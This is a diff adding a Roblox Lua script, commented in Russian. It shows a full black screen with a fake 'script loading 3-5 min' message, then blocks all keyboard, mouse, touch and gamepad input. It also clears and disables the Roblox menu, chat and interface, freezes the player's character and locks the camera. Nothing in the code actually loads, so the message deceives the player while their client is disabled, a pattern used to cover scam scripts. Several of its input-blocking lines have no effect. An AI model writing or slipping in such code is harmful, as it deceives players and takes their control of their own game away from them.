@@ -1,0 +1,152 @@
+local function visual()
+    local player = game.Players.LocalPlayer
+    local PlayerGui = player:WaitForChild("PlayerGui")
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PurpleScrenGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = PlayerGui
+
+    local blackFrame = Instance.new("Frame")
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.BackgroundTransparency = 0
+    blackFrame.ZIndex = 1
+    blackFrame.Parent = screenGui
+    
+    -- Создаем текст СРАЗУ
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.Position = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "Прогрузка скрипта 3-5мин!"
+    textLabel.TextColor3 = Color3.new(1, 0, 1)
+    textLabel.TextSize = 40
+    textLabel.TextScaled = true
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.ZIndex = 2
+    textLabel.Parent = screenGui
+    
+    -- Создаем вращающийся кружок СРАЗУ
+    local circle = Instance.new("Frame")
+    circle.Name = "RotatingCircle"
+    circle.Size = UDim2.new(0, 150, 0, 150)
+    circle.Position = UDim2.new(0.5, 1, 0.5, 1)
+    circle.BackgroundColor3 = Color3.new(1, 0, 0)
+    circle.BorderSizePixel = 0
+    circle.ZIndex = 2
+    circle.Parent = screenGui
+
+    -- Делаем кружок круглым
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(1, 0)
+    corner.Parent = circle
+
+    -- Функция вращения
+    local rotationSpeed = 3
+    local currentRotation = 0
+
+    spawn(function()
+        while true do
+            currentRotation = currentRotation + rotationSpeed
+            circle.Rotation = currentRotation
+            
+            if currentRotation >= 360 then
+                currentRotation = 0
+            end
+            
+            wait(0.016)
+        end
+    end)
+
+    local CAS = game:GetService("ContextActionService")
+
+    local function BlockAll(actionName, inputState, inputObject)
+        return Enum.ContextActionResult.Sink
+    end
+
+    -- Блокируем все клавиши
+    CAS:BindAction("BlockKeys", BlockAll, false, unpack(Enum.KeyCode:GetEnumItems()))
+    -- Блокируем все типы ввода (мышь, тач, геймпад)
+    CAS:BindAction("BlockInput", BlockAll, false, unpack(Enum.UserInputType:GetEnumItems()))
+    
+    -- ДОПОЛНИТЕЛЬНАЯ БЛОКИРОВКА КЛИЕНТА (РАБОТАЕТ НА ТЕЛЕФОНЕ)
+    
+    --блокеровка меню роблокса
+    game:GetService('CoreGui'):ClearAllChildren()
+    -- Блокируем движение персонажа
+    local Players = game:GetService("Players")
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    -- Отключаем движение
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.PlatformStand = true
+    
+    -- Дополнительная блокировка движения
+    spawn(function()
+        while true do
+            if character and character:FindFirstChild("Humanoid") then
+                character.Humanoid.WalkSpeed = 0
+                character.Humanoid.JumpPower = 0
+                character.Humanoid.PlatformStand = true
+            end
+            wait(0.1)
+        end
+    end)
+    
+    -- Блокируем камеру
+    local Camera = workspace.CurrentCamera
+    Camera.CameraType = Enum.CameraType.Scriptable
+    
+    -- Отключаем весь интерфейс Roblox
+    local StarterGui = game:GetService("StarterGui")
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    
+    -- Дополнительное скрытие интерфейса
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.SelfView, false)
+    
+    -- БЛОКИРОВКА ДЛЯ ТЕЛЕФОНА
+    local UserInputService = game:GetService("UserInputService")
+    
+    -- Блокируем все типы ввода на мобильных устройствах
+    pcall(function()
+        UserInputService.TouchEnabled = false
+    end)
+    
+    -- Дополнительная блокировка для мобильных устройств
+    local function blockTouchInput(inputObject, gameProcessed)
+        if inputObject.UserInputType == Enum.UserInputType.Touch then
+            return Enum.ContextActionResult.Sink
+        end
+        return Enum.ContextActionResult.Pass
+    end
+    
+    -- Блокируем касания экрана
+    UserInputService.InputBegan:Connect(function(inputObject, gameProcessed)
+        if inputObject.UserInputType == Enum.UserInputType.Touch then
+            return Enum.ContextActionResult.Sink
+        end
+    end)
+    
+    -- Блокируем все жесты на мобильных устройствах
+    UserInputService.TouchTapInWorld:Connect(function()
+        return Enum.ContextActionResult.Sink
+    end)
+    
+    -- Блокируем поворот экрана
+    UserInputService.DeviceOrientationChanged:Connect(function()
+        return Enum.ContextActionResult.Sink
+    end)
+end
+
+-- Call the function
+visual()
